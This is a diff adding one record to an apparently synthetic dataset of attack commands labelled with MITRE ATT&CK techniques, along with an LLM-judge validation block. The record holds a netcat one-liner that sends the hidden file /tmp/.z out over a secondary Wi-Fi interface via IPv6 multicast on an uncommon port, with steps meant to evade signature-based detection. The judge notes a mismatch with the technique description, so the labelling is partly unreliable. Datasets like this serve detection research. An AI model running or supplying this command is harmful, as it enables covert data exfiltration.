@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -u -s \"$(ipconfig getv6ifaddr llw0)\" \"ff02::1%llw0\" 54901 < /tmp/.z",
+  "explanation": "Uses the low-latency Wi\u2011Fi interface (llw0) to transmit to the all-nodes IPv6 multicast group on a high, uncommon UDP port, exploiting a secondary wireless medium per T1011.",
+  "rationale_steps": [
+    "Query ipconfig for the IPv6 address on llw0 to ensure traffic egresses over the low-latency Wi\u2011Fi medium.",
+    "Bind the sender to that address and target a link-local multicast scope.",
+    "Transmit data over an uncommon UDP port to minimize signature-based detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-63e108fb",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with valid nc flags, balanced quoting, and proper redirection.",
+        "semantic_score": 3,
+        "semantic_justification": "It plausibly sends /tmp/.z via IPv6 UDP multicast on llw0 as claimed, but it does not align with the provided technique description of system script proxy execution and depends on the llw0 interface/address being present.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T21:11:07.082186Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
